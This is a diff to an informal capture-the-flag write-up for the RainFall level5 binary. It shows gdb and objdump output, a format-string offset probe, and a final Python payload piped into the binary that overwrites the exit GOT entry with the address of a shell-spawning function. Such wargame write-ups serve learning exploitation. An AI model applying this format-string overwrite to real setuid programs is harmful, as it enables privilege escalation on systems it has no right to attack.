@@ -51,7 +51,9 @@ Non-debugging symbols:
 0x0804984c  completed.6159
 0x08049850  dtor_idx.6161
 0x08049854  m
-This is lie. We have this variable m, but this doesn't use.
+
+!This is lie. We have this variable m, but this doesn't use.
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048504 <+0>:	push   %ebp
@@ -97,12 +99,24 @@ $1 = 0x80485f0 "/bin/sh"
 And we can see two difference exit in o and n.
 Let's call "o" instead "exit"
 
-See address of exit:
+See address of system exit and C exit:
 level5@RainFall:~$ objdump -R level5 | grep exit
 08049828 R_386_JUMP_SLOT   _exit
 08049838 R_386_JUMP_SLOT   exit  
 
-0x080484a4 -> 134513828
+0x080484a4 - is func o
+p 0x080484a4 <-- than to find address and send it like number to call.
+0x080484a4 -> 134513828       
+
+We are using here offset of %n 
+
+echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level5
+BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
+
+In order we see BBBB under number 4.
+Therefore we put 
+"\x38\x98\x04\x08"  <-address of exit which we replace with address of func o in number (0x080484a4) 134513824
+d%4$n and move it in order number 4 which offset %n to rewrite memory in stack.
 
 python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/breaker66
 cat /tmp/breaker66 - | ./level5
